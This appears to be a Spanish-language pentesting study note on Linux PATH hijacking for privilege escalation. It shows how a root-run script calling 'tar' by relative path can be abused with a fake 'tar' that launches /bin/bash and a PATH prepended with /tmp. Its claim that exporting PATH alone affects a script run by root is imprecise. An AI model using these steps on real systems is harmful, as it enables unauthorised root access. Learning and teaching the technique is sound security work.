
---
- Tags:  #Linux #Attacks #Post-exploitation #PrivEsc 
- --- 
# Qué es? 

Para entender qué es el **Path Hijacking** primero debemos entender qué es la variable _$PATH_.

En Linux, el `PATH` es una **variable de entorno** que le dice al sistema: _Cuando escribas un comando, búscalo en **estos directorios**, en este orden_

**Comprobación**:
```bash
echo $PATH
```

**Salida**:
```bash
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Esto significa:

- Si escribimos `ls`
- Linux busca `ls` en `/usr/local/sbin`
- Si no está ahí, busca en `/usr/local/bin`
- Y así sucesivamente…

**Se ejecuta el PRIMER binario que encuentre con ese nombre.**

# Explotación

Para abusar de un **Path Hijacking** tenemos que comprobar que la ruta del binario ejecutable esté usando una ruta **NO** absoluta. es decir: `bash`, en lugar de `/bin/bash`

Suponiendo que encontramos un binario corriendo como root y contiene:

```bash
#!/bin/bash
backup.sh

tar -czf backup.tar.gz /home/user

```

*tar* no está usando una ruta absoluta, por, lo que nosotros podemos modificar el **PATH** para que un *tar* malicioso se ejecute a nivel root (**root es el que corre el script**)

**Básicamente:** Reemplazamos el *tar* de **Linux** por uno nuestro. 

```
vim tar
```

Dentro del script: 

```bash
#!/bin/bash
/bin/bash
```

Ahora, la ruta donde creamos el **tar** malicioso la exportamos al **PATH**

```bash
export PATH=/tmp:$PATH (en este caso tmp)
```

**Cuando el script original se ejecute, y a su vez, ejecute *tar* primeramente buscará el ejecutable en nuestro *PATH* y ejecutará /bin/bash con permisos root**




